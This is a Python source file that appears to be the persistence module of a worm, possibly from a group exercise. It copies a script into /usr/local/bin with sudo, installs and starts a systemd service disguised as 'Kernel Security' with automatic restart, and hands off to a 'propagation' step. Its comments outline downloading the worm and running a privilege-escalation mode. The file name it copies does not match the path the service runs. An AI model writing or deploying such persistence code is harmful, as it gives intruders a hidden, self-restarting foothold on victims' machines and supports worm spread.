import os
import subprocess


# if Group7.pem is present in /home/user
# run worm with -m instructions
# else
# dowload worm
# run worm -m privesc


def create_systemd_service(script_path, service_path):
    service_content = f"""[Unit]
Description=Kernel Security

[Service]
ExecStart={script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
    with open(service_path, "w") as file:
        file.write(service_content)


# job: create service
def run():
    print("[+] persistence module activated...")

    script_name = "kernel_security.sh"
    service_name = "kernel_security.service"

    # move service script to /usr/local/bin
    subprocess.run(
        ["sudo", "cp", "./utils/kernel_security", "/usr/local/bin"], check=True
    )

    script_path = os.path.join("/usr/local/bin", script_name)
    service_path = os.path.join("/etc/systemd/system", service_name)

    create_systemd_service(script_path, service_path)

    subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True)
    subprocess.run(["sudo", "systemctl", "enable", service_name], check=True)
    subprocess.run(["sudo", "systemctl", "start", service_name], check=True)
    print(f"[+] Service {service_name} created and started")

    next_action = "propagation"
    data = "data"
    return data, next_action


run()
